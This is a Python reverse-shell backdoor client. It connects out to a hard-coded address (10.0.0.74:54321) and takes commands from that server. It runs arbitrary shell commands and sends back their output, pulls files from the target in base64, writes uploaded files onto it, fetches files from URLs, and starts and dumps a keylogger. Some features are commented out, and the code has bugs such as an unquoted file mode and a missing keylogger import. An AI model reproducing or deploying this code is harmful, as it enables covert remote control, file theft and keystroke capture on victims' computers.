#!/usr/bin/python

import socket
import os
import subprocess
import json
import base64
import threading
#import keylogger
import requests
#from mss import mss

# Function to send data from target to server
def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

# Function to receive data from server to target
def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

# Function to dowload a file from a given url
def dowload(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, wb) as out_file:
        out_file.write(get_response.content)

# Function that takes a screenshot on target computer.
# def screenshot():
#     with mss() as screenshot:
#         screenshot.shot()

# shell function to process the commands received from server
def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break

        elif command[:4] == "help":
            help_options = '''\tdownload file --> Downlad a file from target PC.
\tupload file   --> Upload a file to target PC.
\tget url       --> Downlad a file to target PC from a website.
\tq             --> exit shell'''
            reliable_send(help_options)

        elif command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "wb") as fin:
                    file_data = reliable_recv()
                    fin.write(base64.b64decode(file_data))
            except:
                failed = "Failed to uplaod file"
                reliable_send(failed)

        elif command[:3] == "get":
            try:
                dowload(command[4:])
                reliable_send("[+] Downloaded file from url")
            except:
                reliable_send("[-] Failed to download file from url")

        # elif command[:10] == "screenshot":
        #     try:
        #         screenshot()
        #         with open("monitor-1.png", "rb") as sc:
        #             reliable_send(base64.b64encode(sc.read()))
        #         os.remove("monitor-1.png")
        #     except:
        #         reliable_send("[-] Failed to send screenshot")

        elif command[:12] == "keylog_start":
            print("i m here")
            t1 = threading.Thread(target=keylogger.start)
            t1.start()
        elif command[:11] == "keylog_dump":
            fn = open(keylogger_path, "r")
            reliable_send(fn.read())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

keylogger_path = "/home/as/Desktop/keystrokes.txt"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.0.74", 54321))
shell()
sock.close()
